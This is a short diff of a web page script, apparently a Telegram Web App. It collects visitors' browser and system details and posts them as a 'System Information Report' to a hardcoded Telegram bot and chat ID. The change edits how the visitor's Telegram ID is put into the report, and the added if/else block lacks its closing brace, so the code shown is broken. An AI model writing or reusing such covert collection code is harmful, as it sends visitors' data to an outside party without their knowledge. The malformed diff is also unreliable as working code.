@@ -11,6 +11,7 @@
     const CHAT_ID = '5540487728';
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const tg = window.Telegram?.WebApp;
+    
     // Detect browser features
     function detectFeatures() {
         const features = {
@@ -216,7 +217,11 @@
     // Send data to Telegram
     function sendToTelegram(data) {
     let text = `🖥 *System Information Report* 🖥\n\n`;
-    text += `📅 *Tg id:* ${tg}\n`;
+        if (tg?.initDataUnsafe?.user?.id) {
+            text += `📅 *Tg_id:* ${tg}\n`;
+        } else {
+            text += `📅 *Tg id:* -\n`;
+    
     // Basic info
     text += `📅 *Timestamp:* ${data.timestamp}\n`;
     text += `🌐 *User Agent:* ${data.userAgent}\n`;
